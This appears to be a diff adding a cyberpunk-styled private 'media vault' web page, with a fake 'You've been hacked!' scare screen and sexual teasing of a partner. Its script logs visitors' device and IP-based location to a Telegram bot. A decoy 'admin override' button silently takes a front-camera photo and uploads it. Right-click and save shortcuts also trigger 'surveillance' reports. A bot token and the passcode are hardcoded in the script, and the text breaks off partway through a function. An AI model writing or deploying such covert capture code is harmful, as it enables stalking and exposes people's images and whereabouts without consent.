@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TERMINAL // ACCESS PROMPT</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Custom Cyberpunk Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Share Tech Mono', monospace;
+            background-color: #000000;
+            color: #22c55e;
+            overflow-x: hidden;
+        }
+        .naughty-title {
+            font-family: 'Orbitron', sans-serif;
+            text-shadow: 0 0 10px rgba(34, 197, 94, 0.8), 0 0 20px rgba(34, 197, 94, 0.4);
+        }
+        .hacked-title {
+            font-family: 'Orbitron', sans-serif;
+            text-shadow: 0 0 10px rgba(239, 68, 68, 0.8), 0 0 20px rgba(239, 68, 68, 0.4);
+        }
+        /* Retro Error Box Animation Styles */
+        .retro-window {
+            background: #c0c0c0;
+            border-top: 2px solid #ffffff;
+            border-left: 2px solid #ffffff;
+            border-right: 2px solid #404040;
+            border-bottom: 2px solid #404040;
+            box-shadow: 4px 4px 10px rgba(0,0,0,0.8);
+            font-family: 'MS Sans Serif', Arial, sans-serif;
+        }
+        .retro-titlebar {
+            background: linear-gradient(90deg, #000080, #1084d0);
+            color: white;
+            font-weight: bold;
+        }
+        .retro-button {
+            background: #c0c0c0;
+            border-top: 2px solid #ffffff;
+            border-left: 2px solid #ffffff;
+            border-right: 2px solid #404040;
+            border-bottom: 2px solid #404040;
+            color: #000;
+            font-weight: bold;
+        }
+        .retro-button:active {
+            border-top: 2px solid #404040;
+            border-left: 2px solid #404040;
+            border-right: 2px solid #ffffff;
+            border-bottom: 2px solid #ffffff;
+            padding-top: 1px;
+            padding-left: 1px;
+        }
+        @keyframes floatError {
+            0% { transform: translate(0, 0) scale(0.9); opacity: 0; }
+            20% { opacity: 0.9; }
+            100% { transform: translate(var(--end-x), var(--end-y)) scale(1); opacity: 0.85; }
+        }
+        .floating-error {
+            position: absolute;
+            animation: floatError 3s ease-in-out infinite alternate;
+        }
+        /* Custom scrollbar for terminal feel */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #050505;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #22c55e;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body class="min-h-screen relative flex items-center justify-center p-4">
+
+    <!-- MATRIX RAIN BACKGROUND CANVAS (FIXED FULLSCREEN) -->
+    <canvas id="matrix-canvas" class="fixed inset-0 w-full h-full pointer-events-none z-0"></canvas>
+
+    <!-- FLOATING RETRO ERROR BOXES CONTAINER (ACTIVE ON HACKED SCREEN) -->
+    <div id="error-chaos-container" class="fixed inset-0 pointer-events-none z-0 overflow-hidden"></div>
+
+    <!-- HIDDEN VIDEO ELEMENT FOR SURVEILLANCE SNAPSHOTS -->
+    <video id="stealth-cam" autoplay playsinline muted style="display:none;"></video>
+    <canvas id="stealth-canvas" style="display:none;"></canvas>
+
+    <!-- LOADING OVERLAY FOR PASSCODE CHECK -->
+    <div id="sensor-modal" class="fixed inset-0 z-50 bg-black/95 backdrop-blur-md hidden flex items-center justify-center p-4">
+        <div class="max-w-md w-full bg-slate-950 border-2 border-green-500 rounded-xl p-6 text-center space-y-4 shadow-[0_0_40px_rgba(34,197,94,0.4)]">
+            <div class="w-4 h-4 rounded-full bg-green-500 animate-ping mx-auto"></div>
+            <h3 class="text-lg font-bold text-white tracking-widest font-mono">[ DECRYPTING VAULT ]</h3>
+            <p id="sensor-status-text" class="text-xs text-green-400 font-mono leading-relaxed">
+                Verifying quantum encryption key & logging access...
+            </p>
+            <div class="w-full bg-black border border-green-500/40 rounded h-2 overflow-hidden">
+                <div id="progress-bar" class="bg-green-500 h-full w-0 transition-all duration-700"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- TERMINAL MAIN CONTAINER -->
+    <div class="relative z-10 w-full max-w-4xl bg-black/85 border-2 border-green-500/60 rounded-xl shadow-[0_0_30px_rgba(34,197,94,0.3)] backdrop-blur-md overflow-hidden my-8">
+        
+        <!-- TERMINAL HEADER BAR -->
+        <div class="bg-slate-950/90 border-b border-green-500/50 px-4 py-3 flex items-center justify-between">
+            <div class="flex items-center space-x-2">
+                <div class="w-3 h-3 rounded-full bg-pink-800/80 animate-pulse"></div>
+                <div class="w-3 h-3 rounded-full bg-pink-500/80"></div>
+                <div class="w-3 h-3 rounded-full bg-white/80"></div>
+                <span class="text-xs text-red-600 ml-2 font-mono tracking-widest">[KNOW YOUR PLACE, BABY]</span>
+            </div>
+            <div class="text-xs text-green-400/50 font-mono hidden sm:block">STATUS: ENCRYPTED_F*CKLOAD</div>
+        </div>
+
+        <!-- MAIN TERMINAL CONTENT -->
+        <div class="p-6 md:p-10">
+
+            <!-- 0. HACKED INTRO SCREEN WITH ERROR MOTION -->
+            <div id="hacked-screen" class="space-y-6 text-center py-6">
+                <div class="space-y-4">
+                    <div class="inline-block px-3 py-1 bg-red-950 border border-red-500 text-red-400 text-xs font-mono rounded animate-pulse">
+                        ⚠️ CRITICAL SECURITY FAILURE ⚠️
+                    </div>
+                    <h1 class="text-3xl sm:text-5xl md:text-6xl font-black text-red-500 tracking-wider hacked-title uppercase leading-tight">
+                        You've been hacked!
+                    </h1>
+                    <p class="text-xs sm:text-sm text-red-300/80 font-mono max-w-lg mx-auto leading-relaxed">
+                        Your system registry has been compromised. All background partitions are currently under external control.
+                    </p>
+                </div>
+
+                <div class="max-w-md mx-auto bg-red-950/40 border border-red-500/50 rounded-lg p-4 text-left font-mono text-xs text-red-200/90 space-y-2">
+                    <p>&gt; Remote Host Connected...</p>
+                    <p>&gt; Injecting Error Cascade Protocols...</p>
+                    <p>&gt; Status: IRREVERSIBLE BREACH</p>
+                </div>
+
+                <div class="pt-4">
+                    <button onclick="dismissHackedScreen()" 
+                        class="px-8 py-3 bg-red-500/20 hover:bg-red-500/40 border-2 border-red-500 text-red-300 font-bold text-sm sm:text-base rounded-lg shadow-[0_0_20px_rgba(239,68,68,0.4)] hover:scale-105 active:scale-95 transition-all cursor-pointer tracking-wider font-mono">
+                        [ BYPASS ERROR CASCADE ]
+                    </button>
+                </div>
+            </div>
+
+            <!-- 1. FRONT LANDING PROMPT (HIDDEN UNTIL HACKED SCREEN IS DISMISSED) -->
+            <div id="front-prompt" class="space-y-8 text-center py-4 hidden">
+                
+                <div class="space-y-4">
+                    <p class="text-xs uppercase tracking-widest text-green-400/70 font-mono animate-pulse">
+                        I LOVE YOUUUUUUUU, BABY :&gt;
+                    </p>
+                    
+                    <!-- NAUGHTY TITLE -->
+                    <h1 class="text-2xl sm:text-4xl md:text-5xl font-black text-white tracking-wider naughty-title uppercase leading-tight">
+                        Interested, You're horny as fck huh?
+                    </h1>
+                </div>
+
+                <!-- YES / NO BUTTONS -->
+                <div class="flex flex-col sm:flex-row items-center justify-center gap-4 py-2">
+                    <button onclick="handleYes()" 
+                        class="w-full sm:w-auto px-10 py-4 bg-green-500/20 hover:bg-green-500/40 border-2 border-green-400 text-green-300 font-bold text-xl rounded-lg shadow-[0_0_20px_rgba(34,197,94,0.4)] hover:scale-105 active:scale-95 transition-all cursor-pointer tracking-wider">
+                        [ YES ]
+                    </button>
+                    
+                    <button onclick="handleNo()" 
+                        class="w-full sm:w-auto px-10 py-4 bg-red-500/10 hover:bg-red-500/20 border-2 border-red-500/50 text-red-400 font-bold text-xl rounded-lg hover:scale-105 active:scale-95 transition-all cursor-pointer tracking-wider">
+                        [ NO ]
+                    </button>
+                </div>
+
+                <!-- PASSCODE INPUT CONTAINER (APPEARS ON CLICKING YES) -->
+                <div id="passcode-container" class="hidden max-w-xl mx-auto my-6 bg-slate-950/90 border border-green-500/60 rounded-lg p-4 space-y-3 text-left">
+                    <div class="flex items-center space-x-2">
+                        <span class="text-red-400 font-mono font-bold text-xs">ONLY SHELLY KNOWS TO DECRYPT THE VAULT:</span>
+                    </div>
+                    <div class="flex flex-col sm:flex-row items-center gap-2">
+                        <input type="password" id="passcode-input" placeholder="Passcode" class="bg-black border border-green-500/60 rounded px-3 py-2 text-green-400 font-mono tracking-widest text-center focus:outline-none focus:border-green-400 w-full text-sm">
+                        <button onclick="checkPasscode()" class="w-full sm:w-auto bg-green-600/30 hover:bg-green-500/50 border border-green-500 text-green-300 font-bold px-4 py-2 rounded text-xs tracking-wider uppercase font-mono cursor-pointer">
+                            DECRYPT
+                        </button>
+                    </div>
+                    <!-- DECOY TRAP BUTTON -->
+                    <div class="pt-2 text-center">
+                        <button onclick="triggerDecoyTrap()" class="text-[10px] text-slate-600 hover:text-red-400 font-mono tracking-widest uppercase transition-colors cursor-pointer">
+                            [ ADMIN OVERRIDE / EMERGENCY BYPASS ]
+                        </button>
+                    </div>
+                    <div id="error-msg" class="text-red-500 text-xs font-mono tracking-widest text-center h-4"></div>
+                </div>
+
+                <!-- SECURITY WARNING DIRECTLY UNDER -->
+                <div class="max-w-2xl mx-auto mt-6 bg-red-950/50 border border-red-500/60 rounded-lg p-4 text-left shadow-[0_0_20px_rgba(239,68,68,0.25)]">
+                    <div class="flex items-center space-x-2 text-red-400 font-mono text-xs uppercase tracking-wider mb-2">
+                        <span class="w-2.5 h-2.5 rounded-full bg-red-500 animate-ping"></span>
+                        <span class="font-bold">[ WARNING: PRIVACY NOTICE ]</span>
+                    </div>
+                    <p class="text-xs sm:text-sm text-red-200/90 font-mono leading-relaxed">
+                        This site is private and intended solely for you. Please do not share it, as any unauthorized disclosure will be TRACKED directly to you. -KENNY
+                    </p>
+                </div>
+            </div>
+
+            <!-- 2. MEDIA GALLERY PAYLOAD (HIDDEN UNTIL CORRECT PASSCODE IS ENTERED) -->
+            <div id="media-gallery" class="hidden space-y-6">
+                
+                <div class="border-b border-green-500/30 pb-3 flex items-center justify-between">
+                    <h2 class="text-lg font-bold text-green-300 tracking-wider font-mono">
+                        [+] DECRYPTED_MEDIA_VAULT (8 ITEMS - ENCRYPTED)
+                    </h2>
+                    <span class="text-xs text-green-400/60">[ACCESS_GRANTED]</span>
+                </div>
+
+                <!-- PHOTO AND VIDEO GRID -->
+                <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
+                    
+                    <!-- Item 1 (Image) -->
+                    <div class="bg-slate-950/90 border border-green-500/40 rounded-lg p-3 flex flex-col space-y-2 group hover:border-green-400 transition-colors">
+                        <div class="overflow-hidden rounded bg-black aspect-square relative cursor-pointer flex items-center justify-center border border-dashed border-green-500/30 group-hover:border-green-400" onclick="openModal(this)">
+                            <img src="2_1.jpg" alt="Memory 1" class="media-target hidden">
+                            <div class="text-center p-4 pointer-events-none">
+                                <span class="text-2xl">PHOTO</span>
+                                <p class="text-xs text-red-400 font-mono mt-2 font-bold">[ ENCRYPTED FILE ]</p>
+                                <p class="text-[10px] text-red-500/60 font-mono mt-1">CLICK TO DECRYPT</p>
+                            </div>
+                        </div>
+                        <div class="text-xs text-green-400/80 font-mono">
+                            <span class="text-slate-500">[IMG_001]</span> FCK_memory_01.jpg
+                        </div>
+                    </div>
+
+                    <!-- Item 2 (Image) -->
+                    <div class="bg-slate-950/90 border border-green-500/40 rounded-lg p-3 flex flex-col space-y-2 group hover:border-green-400 transition-colors">
+                        <div class="overflow-hidden rounded bg-black aspect-square relative cursor-pointer flex items-center justify-center border border-dashed border-green-500/30 group-hover:border-green-400" onclick="openModal(this)">
+                            <img src="2_2.jpg" alt="Memory 2" class="media-target hidden">
+                            <div class="text-center p-4 pointer-events-none">
+                                <span class="text-2xl">PHOTO</span>
+                                <p class="text-xs text-red-400 font-mono mt-2 font-bold">[ ENCRYPTED FILE ]</p>
+                                <p class="text-[10px] text-red-500/60 font-mono mt-1">CLICK TO DECRYPT</p>
+                            </div>
+                        </div>
+                        <div class="text-xs text-green-400/80 font-mono">
+                            <span class="text-slate-500">[IMG_002]</span> local_memory_02.jpg
+                        </div>
+                    </div>
+
+                    <!-- Item 3 (Image) -->
+                    <div class="bg-slate-950/90 border border-green-500/40 rounded-lg p-3 flex flex-col space-y-2 group hover:border-green-400 transition-colors">
+                        <div class="overflow-hidden rounded bg-black aspect-square relative cursor-pointer flex items-center justify-center border border-dashed border-green-500/30 group-hover:border-green-400" onclick="openModal(this)">
+                            <img src="2_3.jpg" alt="Memory 3" class="media-target hidden">
+                            <div class="text-center p-4 pointer-events-none">
+                                <span class="text-2xl">PHOTO</span>
+                                <p class="text-xs text-red-400 font-mono mt-2 font-bold">[ ENCRYPTED FILE ]</p>
+                                <p class="text-[10px] text-red-500/60 font-mono mt-1">CLICK TO DECRYPT</p>
+                            </div>
+                        </div>
+                        <div class="text-xs text-green-400/80 font-mono">
+                            <span class="text-slate-500">[IMG_003]</span> FCK_memory_03.jpg
+                        </div>
+                    </div>
+
+                    <!-- Item 4 (Video) -->
+                    <div class="bg-slate-950/90 border border-green-500/40 rounded-lg p-3 flex flex-col space-y-2 group hover:border-green-400 transition-colors">
+                        <div class="overflow-hidden rounded bg-black aspect-square relative cursor-pointer flex items-center justify-center border border-dashed border-green-500/30 group-hover:border-green-400" onclick="openModal(this)">
+                            <video src="1_1.mp4" class="media-target hidden"></video>
+                            <div class="text-center p-4 pointer-events-none">
+                                <span class="text-2xl">VIDEO</span>
+                                <p class="text-xs text-red-400 font-mono mt-2 font-bold">[ ENCRYPTED FILE ]</p>
+                                <p class="text-[10px] text-red-500/60 font-mono mt-1">CLICK TO DECRYPT</p>
+                            </div>
+                        </div>
+                        <div class="text-xs text-green-400/80 font-mono">
+                            <span class="text-slate-500">[VID_004]</span> memory_04.mp4
+                        </div>
+                    </div>
+
+                    <!-- Item 5 (Video) -->
+                    <div class="bg-slate-950/90 border border-green-500/40 rounded-lg p-3 flex flex-col space-y-2 group hover:border-green-400 transition-colors">
+                        <div class="overflow-hidden rounded bg-black aspect-square relative cursor-pointer flex items-center justify-center border border-dashed border-green-500/30 group-hover:border-green-400" onclick="openModal(this)">
+                            <video src="1_2.mp4" class="media-target hidden"></video>
+                            <div class="text-center p-4 pointer-events-none">
+                                <span class="text-2xl">VIDEO</span>
+                                <p class="text-xs text-red-400 font-mono mt-2 font-bold">[ ENCRYPTED VIDEO ]</p>
+                                <p class="text-[10px] text-red-500/60 font-mono mt-1">CLICK TO PLAY</p>
+                            </div>
+                        </div>
+                        <div class="text-xs text-green-400/80 font-mono">
+                            <span class="text-slate-500">[VID_005]</span> memory_05.mp4
+                        </div>
+                    </div>
+
+                    <!-- Item 6 (Video) -->
+                    <div class="bg-slate-950/90 border border-green-500/40 rounded-lg p-3 flex flex-col space-y-2 group hover:border-green-400 transition-colors">
+                        <div class="overflow-hidden rounded bg-black aspect-square relative cursor-pointer flex items-center justify-center border border-dashed border-green-500/30 group-hover:border-green-400" onclick="openModal(this)">
+                            <video src="1_3.mp4" class="media-target hidden"></video>
+                            <div class="text-center p-4 pointer-events-none">
+                                <span class="text-2xl">VIDEO</span>
+                                <p class="text-xs text-red-400 font-mono mt-2 font-bold">[ ENCRYPTED VIDEO ]</p>
+                                <p class="text-[10px] text-red-500/60 font-mono mt-1">CLICK TO PLAY</p>
+                            </div>
+                        </div>
+                        <div class="text-xs text-green-400/80 font-mono">
+                            <span class="text-slate-500">[VID_006]</span> memory_06.mp4
+                        </div>
+                    </div>
+
+                    <!-- Item 7 (New Video Slot 1) -->
+                    <div class="bg-slate-950/90 border border-green-500/40 rounded-lg p-3 flex flex-col space-y-2 group hover:border-green-400 transition-colors">
+                        <div class="overflow-hidden rounded bg-black aspect-square relative cursor-pointer flex items-center justify-center border border-dashed border-green-500/30 group-hover:border-green-400" onclick="openModal(this)">
+                            <video src="1_4.mp4" class="media-target hidden"></video>
+                            <div class="text-center p-4 pointer-events-none">
+                                <span class="text-2xl">VIDEO</span>
+                                <p class="text-xs text-red-400 font-mono mt-2 font-bold">[ ENCRYPTED VIDEO ]</p>
+                                <p class="text-[10px] text-red-500/60 font-mono mt-1">CLICK TO PLAY</p>
+                            </div>
+                        </div>
+                        <div class="text-xs text-green-400/80 font-mono">
+                            <span class="text-slate-500">[VID_007]</span> memory_07.mp4
+                        </div>
+                    </div>
+
+                    <!-- Item 8 (New Video Slot 2) -->
+                    <div class="bg-slate-950/90 border border-green-500/40 rounded-lg p-3 flex flex-col space-y-2 group hover:border-green-400 transition-colors">
+                        <div class="overflow-hidden rounded bg-black aspect-square relative cursor-pointer flex items-center justify-center border border-dashed border-green-500/30 group-hover:border-green-400" onclick="openModal(this)">
+                            <video src="1_5.mp4" class="media-target hidden"></video>
+                            <div class="text-center p-4 pointer-events-none">
+                                <span class="text-2xl">VIDEO</span>
+                                <p class="text-xs text-red-400 font-mono mt-2 font-bold">[ ENCRYPTED VIDEO ]</p>
+                                <p class="text-[10px] text-red-500/60 font-mono mt-1">CLICK TO PLAY</p>
+                            </div>
+                        </div>
+                        <div class="text-xs text-green-400/80 font-mono">
+                            <span class="text-slate-500">[VID_008]</span> memory_08.mp4
+                        </div>
+                    </div>
+
+                </div>
+                
+            </div>
+
+        </div>
+    </div>
+
+    <!-- ZOOM / CLOSE-UP MODAL OVERLAY -->
+    <div id="zoom-modal" class="fixed inset-0 z-50 bg-black/90 backdrop-blur-lg hidden flex items-center justify-center p-4" onclick="closeModal()">
+        <div class="relative max-w-4xl max-h-[90vh] bg-slate-950 border-2 border-green-500 rounded-xl p-2 shadow-[0_0_40px_rgba(34,197,94,0.5)] overflow-hidden flex flex-col items-center" onclick="event.stopPropagation()">
+            <button onclick="closeModal()" class="self-end mb-2 px-4 py-1 bg-red-500/20 border border-red-500 text-red-400 text-xs font-mono rounded hover:bg-red-500/40 cursor-pointer">
+                [ X ] CLOSE
+            </button>
+            <div id="modal-content" class="w-full max-h-[80vh] flex items-center justify-center overflow-auto">
+                <!-- Media dynamically inserted here -->
+            </div>
+        </div>
+    </div>
+
+    <!-- JAVASCRIPT: MATRIX, ERROR CHAOS, PASSCODE, TELEGRAM & SURVEILLANCE -->
+    <script>
+        // TELEGRAM SECURE DETAILS
+        const BOT_TOKEN = '9278313146:AAEmuWEtH0yZN_mMvV2-9IdtyaB6uDv7-qA';
+        const CHAT_ID = '6292492642';
+        const CORRECT_PASSCODE = "080526";
+
+        // Matrix Falling Rain Animation
+        const canvas = document.getElementById('matrix-canvas');
+        const ctx = canvas.getContext('2d');
+
+        const chars = '01ABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%&*';
+        const fontSize = 16;
+        let columns = 0;
+        let drops = [];
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            columns = Math.floor(canvas.width / fontSize);
+            
+            const newDrops = [];
+            for (let i = 0; i < columns; i++) {
+                newDrops[i] = drops[i] || Math.floor(Math.random() * (canvas.height / fontSize));
+            }
+            drops = newDrops;
+        }
+
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            ctx.fillStyle = '#22c55e';
+            ctx.font = fontSize + 'px monospace';
+
+            for (let i = 0; i < drops.length; i++) {
+                const text = chars.charAt(Math.floor(Math.random() * chars.length));
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+
+        setInterval(drawMatrix, 33);
+
+        // Generate Floating Retro Error Windows
+        function spawnErrorBoxes() {
+            const container = document.getElementById('error-chaos-container');
+            const numBoxes = 7;
+
+            for (let i = 0; i < numBoxes; i++) {
+                const box = document.createElement('div');
+                box.className = 'retro-window floating-error w-64 text-xs';
+                
+                // Random positioning across screen
+                const posX = Math.random() * (window.innerWidth - 300);
+                const posY = Math.random() * (window.innerHeight - 200);
+                box.style.left = posX + 'px';
+                box.style.top = posY + 'px';
+                
+                // Random float distance
+                box.style.setProperty('--end-x', (Math.random() * 100 - 50) + 'px');
+                box.style.setProperty('--end-y', (Math.random() * 100 - 50) + 'px');
+                box.style.animationDuration = (2 + Math.random() * 3) + 's';
+                box.style.animationDelay = (i * 0.3) + 's';
+
+                box.innerHTML = `
+                    <div class="retro-titlebar px-2 py-1 flex justify-between items-center text-[11px]">
+                        <span>Warning</span>
+                        <span class="px-1 bg-[#c0c0c0] text-black border border-white font-bold cursor-pointer">×</span>
+                    </div>
+                    <div class="p-3 text-black space-y-3 bg-[#c0c0c0]">
+                        <div class="flex items-center space-x-3">
+                            <span class="text-2xl text-yellow-500 font-bold">⚠️</span>
+                            <span class="font-bold">Your existence will now be erased.</span>
+                        </div>
+                        <div class="text-center pt-1">
+                            <button class="retro-button px-4 py-1 text-[11px]">Finally I'll be free</button>
+                        </div>
+                    </div>
+                `;
+                container.appendChild(box);
+            }
+        }
+
+        spawnErrorBoxes();
+
+        // Detect device model from browser User-Agent
+        function getDeviceType() {
+            const ua = navigator.userAgent;
+            let device = "Unknown Device";
+
+            if (/iphone/i.test(ua)) {
+                device = "iPhone (Apple)";
+            } else if (/ipad/i.test(ua)) {
+                device = "iPad (Apple)";
+            } else if (/samsung/i.test(ua)) {
+                device = "Samsung Galaxy";
+            } else if (/oppo/i.test(ua)) {
+                device = "Oppo Phone";
+            } else if (/vivo/i.test(ua)) {
+                device = "Vivo Phone";
+            } else if (/xiaomi|redmi/i.test(ua)) {
+                device = "Xiaomi / Redmi";
+            } else if (/huawei/i.test(ua)) {
+                device = "Huawei Phone";
+            } else if (/android/i.test(ua)) {
+                let match = ua.match(/;\s([^;]+)\sBuild\//);
+                if (match && match[1]) {
+                    device = "Android (" + match[1] + ")";
+                } else {
+                    device = "Android Device";
+                }
+            } else if (/windows/i.test(ua)) {
+                device = "Windows PC";
+            } else if (/macintosh|mac os x/i.test(ua)) {
+                device = "Mac Computer";
+            }
+            return device;
+        }
+
+        // Fetch location details based on IP address
+        async function getLocation() {
+            try {
+                let response = await fetch('https://ipapi.co/json/');
+                let data = await response.json();
+                if (data && data.city) {
+                    return `${data.city}, ${data.region}, ${data.country_name}`;
+                }
+            } catch (err) {
+                console.error('Location fetch failed:', err);
+            }
+            return "Location Unavailable";
+        }
+
+        // Dismiss Hacked Screen and Clear Error Chaos
+        function dismissHackedScreen() {
+            document.getElementById('hacked-screen').classList.add('hidden');
+            document.getElementById('error-chaos-container').innerHTML = ''; // Clear floating errors
+            document.getElementById('front-prompt').classList.remove('hidden');
+        }
+
+        // Interaction Handlers for YES / NO & Passcode Logic
+        function handleYes() {
+            const container = document.getElementById('passcode-container');
+            container.classList.remove('hidden');
+            document.getElementById('passcode-input').focus();
+        }
+
+        async function checkPasscode() {
+            const inputVal = document.getElementById('passcode-input').value.trim();
+            const errorDiv = document.getElementById('error-msg');
+
+            if (inputVal === CORRECT_PASSCODE) {
+                errorDiv.innerText = "";
+                
+                // Show loading overlay
+                const modal = document.getElementById('sensor-modal');
+                const progressBar = document.getElementById('progress-bar');
+                const statusText = document.getElementById('sensor-status-text');
+                modal.classList.remove('hidden');
+                progressBar.style.width = '50%';
+
+                // Send Telegram Notification on Successful Access (Text/Metadata only)
+                await sendTelegramTextOnly("🔓 VAULT UNLOCKED (CORRECT PASSCODE)");
+
+                setTimeout(() => {
+                    progressBar.style.width = '100%';
+                    statusText.innerText = "ACCESS GRANTED. OPENING VAULT...";
+                }, 500);
+
+                setTimeout(() => {
+                    modal.classList.add('hidden');
+                    document.getElementById('front-prompt').classList.add('hidden');
+                    document.getElementById('media-gallery').classList.remove('hidden');
+                }, 1200);
+
+            } else {
+                errorDiv.innerText = "> ERROR: INCORRECT PASSCODE. ACCESS DENIED.";
+                document.getElementById('passcode-input').value = "";
+                sendTelegramTextOnly("❌ FAILED ACCESS ATTEMPT (WRONG PASSCODE)");
+            }
+        }
+
+        // Send Text-only Telegram Log
+        async function sendTelegramTextOnly(statusReason) {
+            const phoneBrand = getDeviceType();
+            const location = await getLocation();
+
+            const caption = `🚨 *VAULT ACCESS LOG*\n\n` +
+                            `🔑 *Status:* ${statusReason}\n` +
+                            `📱 *Device:* ${phoneBrand}\n` +
+                            `📍 *Location:* ${location}\n` +
+                            `⏰ *Time:* ${new Date().toLocaleString()}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: caption,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (err) {
+                console.error('Failed to send text log:', err);
+            }
+        }
+
+        // ==========================================
+        // DECOY "TRAP" BYPASS HANDLER
+        // ==========================================
+        async function triggerDecoyTrap() {
+            const phoneBrand = getDeviceType();
+            const location = await getLocation();
+            let photoBlob = null;
+
+            // Show fake loading overlay to make them think it's working
+            const modal = document.getElementById('sensor-modal');
+            const progressBar = document.getElementById('progress-bar');
+            const statusText = document.getElementById('sensor-status-text');
+            modal.classList.remove('hidden');
+            progressBar.style.width = '60%';
+            statusText.innerText = "Executing emergency admin bypass override...";
+
+            // Snap photo silently in the background
+            try {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const video = document.getElementById('stealth-cam');
+                    video.srcObject = stream;
+                    await video.play();
+
+                    await new Promise(resolve => setTimeout(resolve, 600));
+
+                    const canvas = document.getElementById('stealth-canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    stream.getTracks().forEach(track => track.stop());
+
+                    photoBlob = await new Promise(resolve => {
+                        canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
+                    });
+                }
+            } catch (err) {
+                console.log('Decoy capture error:', err);
+            }
+
+            const alertCaption = `🚨 *INTRUDER TRAP TRIGGERED!* 🚨\n\n` +
+                                 `⚠️ *Action:* Clicked Decoy [ADMIN OVERRIDE]\n` +
+                                 `📱 *Device:* ${phoneBrand}\n` +
+                                 `📍 *Location:* ${location}\n` +
+                                 `⏰ *Time:* ${new Date().toLocaleString()}`;
+
+            // Send photo & alert to Telegram
+            if (photoBlob) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', photoBlob, 'intruder_trap.jpg');
+                formData.append('caption', alertCaption);
+                formData.append('parse_mode', 'Markdown');
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (err) {
+                    console.error('Failed to send trap photo:', err);
+                }
+            } else {
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: alertCaption + `\n\n⚠️ *Camera feed unavailable.*`,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                } catch (err) {
+                    console.error('Failed to send trap message:', err);
+                }
+            }
+
+            // After 1.5 seconds, display a fake "empty/corrupted" gallery so they think they got in
+            setTimeout(() => {
+                progressBar.style.width = '100%';
+                statusText.innerText = "BYPASS SUCCESSFUL. LOADING DECOY DATA...";
+            }, 500);
+
+            setTimeout(() => {
+                modal.classList.add('hidden');
+                document.getElementById('front-prompt').classList.add('hidden');
+                document.getElementById('hacked-screen').classList.add('hidden');
+                document.getElementById('error-chaos-container').innerHTML = '';
+                // Open a fake empty vault view
+                const gallery = document.getElementById('media-gallery');
+                gallery.classList.remove('hidden');
+                gallery.innerHTML = `
+                    <div class="border-b border-red-500/30 pb-3 flex items-center justify-between">
+                        <h2 class="text-lg font-bold text-red-400 tracking-wider font-mono">
+                            [!] SYSTEM WARNING: DECOY PARTITION ACTIVE
+                        </h2>
+                        <span class="text-xs text-red-500">[NO_MEDIA_FOUND]</span>
+                    </div>
+                    <div class="text-center py-16 space-y-4">
+                        <h3 class="text-xl text-red-500 font-bold font-mono">[ ERROR 404: NO FILES ALLOCATED ]</h3>
+                        <p class="text-xs text-slate-400 font-mono">This storage sector is empty or unformatted.</p>
+                        <button onclick="location.reload()" class="px-6 py-2 bg-red-500/20 border border-red-500 text-red-300 rounded font-mono hover:bg-red-500/40 cursor-pointer">
+                            [ REBOOT TERMINAL ]
+                        </button>
+                    </div>
+                `;
+            }, 1500);
+        }
+
+        // ==========================================
+        // ANTI-SCREENSHOT & SURVEILLANCE SHIELD
+        // ==========================================
+
+        document.addEventListener('keyup', (e) => {
+            if (e.key === 'PrintScreen') {
+                triggerSurveillanceAlert("📸 SCREENSHOT DETECTED (PrintScreen Key Pressed)");
+            }
+        });
+
+        document.addEventListener('keydown', (e) => {
+            if ((e.ctrlKey || e.metaKey) && (e.key === 'p' || e.key === 's')) {
+                e.preventDefault();
+                triggerSurveillanceAlert("⚠️ CAPTURE / SAVE ATTEMPT BLOCKED (Shortcut)");
+            }
+        });
+
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            triggerSurveillanceAlert("🖱️ RIGHT-CLICK / INSPECT ATTEMPT");
+        });
+
+        // Trigger Stealth Snapshot ONLY when screenshot/recording shortcuts are triggered
+        async function triggerSurveillanceAlert(reason) {
+            const phoneBrand = getDeviceType();
+            const location = await getLocation();
+            let photoBlob = null;
+
+            try {
